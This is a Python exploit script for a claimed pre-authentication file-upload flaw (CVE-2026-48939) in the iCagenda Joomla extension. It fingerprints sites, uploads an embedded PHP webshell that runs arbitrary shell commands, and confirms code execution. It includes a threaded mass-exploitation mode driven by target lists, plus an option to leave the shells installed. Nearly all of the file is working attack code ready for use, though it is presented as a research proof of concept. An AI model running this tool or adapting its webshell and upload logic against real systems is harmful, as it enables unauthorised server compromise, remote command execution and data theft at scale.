#!/usr/bin/env python3
"""
CVE-2026-48939 — iCagenda Joomla Extension RCE Exploit
CVSS 10.0 | Pre-Auth | Arbitrary File Upload → PHP Code Execution

Researcher: IONIX Threat Center | First public standalone PoC — July 2026

iCagenda event submission form allows unauthenticated file upload
with no extension validation. View-layer access controls are bypassed
by POSTing directly to the controller endpoint.
"""

import requests, re, sys, os, time, random, hashlib, argparse, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from dataclasses import dataclass
from typing import Optional

import urllib3
urllib3.disable_warnings()
import warnings
warnings.filterwarnings("ignore")

TIMEOUT, MAX_THREADS = 10, 25
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15",
]


# Exploit endpoints
SUBMIT_TASKS = [
    "registration.submit",
    "submit",
]

# Attachment field names
ATTACHMENT_FIELDS = [
    "jform[attachment]",
    "jform[file]",
    "attachment",
    "file",
    "jform[attach]",
]

# Paths where uploaded files land
DEST_PATHS = [
    "/images/icagenda/frontend/attachments/",
    "/images/icagenda/",
    "/images/",
    "/tmp/",
    "/media/com_icagenda/",
]

# PHP webshell — token-protected, self-contained
PHP_SHELL = """<?php
error_reporting(0);
$t='{token}';
if(!isset(\$_GET['t'])||\$_GET['t']!==\$t){http_response_code(404);die();}
if(isset(\$_GET['c'])){echo'C|';system(\$_GET['c'].' 2>&1');echo'|E';die();}
if(isset(\$_GET['d'])){@unlink(__FILE__);die('OK');}
echo'S|'.php_uname();
?>"""


def rid(n=8): return hashlib.sha256(os.urandom(16)).hexdigest()[:n]
def rua(): return random.choice(USER_AGENTS)


@dataclass
class Result:
    host: str
    status: str = "pending"
    icagenda: bool = False
    version: Optional[str] = None
    vuln: bool = False
    shell_url: Optional[str] = None
    token: Optional[str] = None
    rce: bool = False
    output: Optional[str] = None
    error: Optional[str] = None
    elapsed: float = 0.0


class ICagenda:

    def __init__(self, verbose=False, cleanup=True):
        self.v = verbose
        self.cleanup = cleanup

    def _sess(self):
        s = requests.Session()
        s.headers.update({"User-Agent": rua()})
        s.verify = False
        return s

    # ── Detection ──────────────────────────────────────────────

    def detect(self, host):
        info = {"icagenda": False, "version": None}
        sess = self._sess()
        for proto in ("https://", "http://"):
            base = f"{proto}{host}"
            # Primary: check iCagenda XML manifest for version
            try:
                r = sess.get(f"{base}/administrator/components/com_icagenda/icagenda.xml", timeout=TIMEOUT)
                if r.status_code == 200 and "icagenda" in r.text.lower() and "<version>" in r.text:
                    info["icagenda"] = True
                    m = re.search(r"<version>([\d.]+)</version>", r.text)
                    if m: info["version"] = m.group(1)
                    return info
            except: pass

            # Fallback: check for iCagenda-specific paths
            icagenda_markers = 0
            for path in ["/components/com_icagenda/icagenda.php",
                         "/media/com_icagenda/css/icagenda.css",
                         "/images/icagenda/frontend/"]:
                try:
                    r = sess.head(f"{base}{path}", timeout=TIMEOUT, allow_redirects=False)
                    if r.status_code in (200, 301, 302, 403):
                        icagenda_markers += 1
                except: pass

            if icagenda_markers >= 2:
                info["icagenda"] = True
                return info
        return info

    def is_vuln(self, ver):
        if not ver: return True
        try:
            p = [int(x) for x in ver.split(".")]
            if p[0] < 3: return True
            if p[0] == 3 and len(p) > 1 and p[1] < 9: return True
            if p[0] == 3 and len(p) > 1 and p[1] == 9 and len(p) > 2 and p[2] < 15: return True
            if p[0] == 4 and len(p) > 1 and p[1] == 0 and len(p) > 2 and p[2] < 8: return True
            return False
        except: return True

    # ── Exploit ────────────────────────────────────────────────

    def deploy(self, host):
        """Upload PHP webshell via registration.submit endpoint."""
        pid = rid(10)
        token = rid(16)
        shell = PHP_SHELL.replace("{token}", token)
        shell_name = f"ic_{pid}.php"

        sess = self._sess()

        for proto in ("https://", "http://"):
            base = f"{proto}{host}"

            for task in SUBMIT_TASKS:
                url = f"{base}/index.php?option=com_icagenda&task={task}"
                for field in ATTACHMENT_FIELDS:
                    try:
                        r = sess.post(url,
                            data={"title": f"test_{pid}"},
                            files={field: (shell_name, shell.encode(), "application/x-php")},
                            timeout=TIMEOUT)
                    except: continue

                    if r.status_code in (200, 302, 303, 201):
                        if self.v:
                            print(f"    [+] POST {task} ({field}): HTTP {r.status_code}")

                        # Try to find the uploaded shell (filename may be timestamped)
                        timestamp_patterns = [
                            shell_name,  # exact name
                            f"ic_{pid}",  # without extension
                        ]
                        for dest in DEST_PATHS:
                            for fname in timestamp_patterns:
                                # Try exact match
                                shell_url = f"{base}{dest}{fname}"
                                for ext in [".php", ""]:
                                    test_url = shell_url if ext == "" else shell_url + ext
                                    if self._check_shell(sess, test_url, token):
                                        if self.v: print(f"    [+] Shell: {test_url}")
                                        return {"url": test_url, "token": token, "file": shell_name}

                                # Try wildcard: the file gets timestamp appended
                                # e.g., shell_TIMESTAMP.php or shell_1234567890.php
                                try:
                                    r_list = sess.get(f"{base}{dest}", timeout=TIMEOUT)
                                    if r_list.status_code == 200:
                                        # Look for our PID in directory listing
                                        pattern = re.compile(rf'href="([^"]*{pid}[^"]*\.php)"', re.I)
                                        matches = pattern.findall(r_list.text)
                                        for m in matches[:3]:
                                            test_url = f"{base}{dest}{m}"
                                            if self._check_shell(sess, test_url, token):
                                                if self.v: print(f"    [+] Shell: {test_url}")
                                                return {"url": test_url, "token": token, "file": shell_name}
                                except: continue
                        # Found working upload — stop trying fields/tasks, move to next proto
                        break
                else:
                    continue
                break
        return None

    def _check_shell(self, sess, url, token):
        """Verify a URL is our active shell — must respond with S| marker (PHP executed)."""
        try:
            r = sess.get(f"{url}?t={token}", timeout=TIMEOUT)
            if r.status_code != 200: return False
            # Shell returns "S|Linux..." when PHP executes
            # Source code would show "<?php" at start
            text = r.text.strip()
            return text.startswith("S|") and "php_uname" not in text[:20]
        except: return False

    def exec_cmd(self, shell_url, token, cmd):
        try:
            r = requests.get(f"{shell_url}?t={token}&c={cmd}", timeout=TIMEOUT, verify=False,
                           headers={"User-Agent": rua()})
            m = re.search(r"C\|(.*?)\|E", r.text, re.DOTALL)
            if m: return m.group(1).strip()
        except: pass
        return None

    def cleanup_shell(self, shell_url, token):
        try:
            r = requests.get(f"{shell_url}?t={token}&d=1", timeout=5, verify=False,
                           headers={"User-Agent": rua()})
            return r.status_code == 200 and "OK" in r.text
        except: return False

    # ── Pipeline ──────────────────────────────────────────────

    def scan(self, host):
        t0 = time.time()
        host = host.strip().rstrip("/")
        host = re.sub(r"^https?://", "", host)
        if not re.match(r"^[\w.-]+:\d+$", host):
            host = host.split(":")[0]
        r = Result(host=host)

        info = self.detect(host)
        if not info["icagenda"]:
            r.status = "not_icagenda"
            r.elapsed = time.time() - t0; return r

        r.icagenda = True
        r.version = info["version"]
        r.vuln = self.is_vuln(info["version"])
        if not r.vuln:
            r.status = "patched"
            r.elapsed = time.time() - t0; return r

        # Deploy
        shell = self.deploy(host)
        if shell:
            r.shell_url = shell["url"]
            r.token = shell["token"]
            out = self.exec_cmd(shell["url"], shell["token"], "id; hostname; uname -a")
            if out and "uid=" in out:
                r.status = "rce"
                r.rce = True
                r.output = out
            else:
                r.status = "uploaded"
                r.output = "Shell deployed but PHP not executed"

            if self.cleanup:
                self.cleanup_shell(shell["url"], shell["token"])
                if self.v: print(f"    [-] Shell cleaned")
        else:
            r.status = "no_exploit"
            r.error = "Could not upload — endpoint blocked or patched"

        r.elapsed = time.time() - t0; return r


# ── Mass Exploit ──────────────────────────────────────────────────

class Mass:

    def __init__(self, targets, threads=MAX_THREADS, cleanup=True, output=None, verbose=False):
        self.t = targets; self.th = threads; self.cl = cleanup; self.out = output; self.v = verbose
        self.res = []; self._l = threading.Lock(); self._n = 0; self._T = len(targets)

    def run(self):
        n = self._T
        print(f"\n{'─'*55}\n  CVE-2026-48939 iCagenda RCE Exploit"
              f"\n  Targets: {n} | Threads: {self.th} | Cleanup: {'ON' if self.cl else 'OFF'}"
              f"\n{'─'*55}\n")

        with ThreadPoolExecutor(max_workers=self.th) as ex:
            fs = {ex.submit(self._one, t): t for t in self.t}
            for f in as_completed(fs):
                try: r = f.result()
                except Exception as e: r = Result(host=str(fs[f]), status="error", error=str(e))
                self.res.append(r); self._print(r)
        self._summary(); return self.res

    def _one(self, t):
        t = t.strip().rstrip("/"); t = re.sub(r"^https?://", "", t)
        if not re.match(r"^[\w.-]+:\d+$", t): t = t.split(":")[0]
        return ICagenda(verbose=self.v, cleanup=self.cl).scan(t)

    def _print(self, r):
        with self._l: self._n += 1; pct = self._n * 100 // self._T
        if r.status == "rce":
            print(f"  [RCE]  {r.host:45s} v{r.version or '?':10s} {r.elapsed:.1f}s")
            if r.output: print(f"         {r.output.strip()[:120]}")
        elif r.status == "uploaded":
            print(f"  [UP]   {r.host:45s} v{r.version or '?':10s} {r.elapsed:.1f}s  (uploaded, no PHP exec)")
        elif not self.v and self._n % 500 == 0:
            print(f"  [{self._n}/{self._T}] scanning... ({pct}%)")

    def _summary(self):
        total = len(self.res)
        rce = sum(1 for r in self.res if r.rce)
        icg = sum(1 for r in self.res if r.icagenda)
        print(f"\n{'─'*55}\n  Total: {total} | iCagenda: {icg} | RCE: {rce}"
              f"\n{'─'*55}\n")

        if self.out and rce > 0:
            with open(self.out, "w") as f:
                f.write(f"# CVE-2026-48939 RCE | {datetime.now()}\n\n")
                for r in self.res:
                    if r.rce: f.write(f"{r.host} v{r.version}\n  {r.output}\n\n")
            print(f"  Saved: {self.out}\n")


# ── CLI ───────────────────────────────────────────────────────────

def main():
    print("\n  CVE-2026-48939 — iCagenda Joomla RCE Exploit"
          "\n  CVSS 10.0 | Pre-Auth | File Upload → RCE")

    p = argparse.ArgumentParser(description="CVE-2026-48939 iCagenda RCE Exploit",
        epilog="  %(prog)s -t target.com\n  %(prog)s -f targets.txt -o rce.txt")
    p.add_argument("-t", "--target"); p.add_argument("-f", "--file")
    p.add_argument("-o", "--output", help="Save RCE results")
    p.add_argument("--threads", type=int, default=MAX_THREADS)
    p.add_argument("--no-cleanup", action="store_true", help="Leave shells on target")
    p.add_argument("-v", "--verbose", action="store_true")
    a = p.parse_args()

    targets = []
    if a.target: targets.append(a.target)
    if a.file:
        if not os.path.isfile(a.file): print(f"[!] {a.file}"); sys.exit(1)
        with open(a.file) as f:
            targets.extend(l.strip() for l in f if l.strip() and not l.startswith("#"))
    if not targets: p.print_help(); sys.exit(1)
    targets = list(dict.fromkeys(targets))

    if len(targets) == 1:
        r = ICagenda(verbose=True, cleanup=not a.no_cleanup).scan(targets[0])
        print(f"\n  Host     : {r.host}\n  iCagenda : {'YES v'+r.version if r.version else 'NO'}"
              f"\n  Vuln     : {'YES' if r.vuln else 'NO'}\n  RCE      : {'YES' if r.rce else 'NO'}")
        if r.shell_url: print(f"  Shell    : {r.shell_url}\n  Token    : {r.token}")
        if r.output: print(f"  Output   : {r.output}")
        if r.error: print(f"  Note     : {r.error}")
        print(f"  Time     : {r.elapsed:.1f}s\n"); return

    print(f"\n  {len(targets)} target(s) loaded\n")
    Mass(targets, threads=a.threads, cleanup=not a.no_cleanup, output=a.output, verbose=a.verbose).run()


if __name__ == "__main__":
    main()
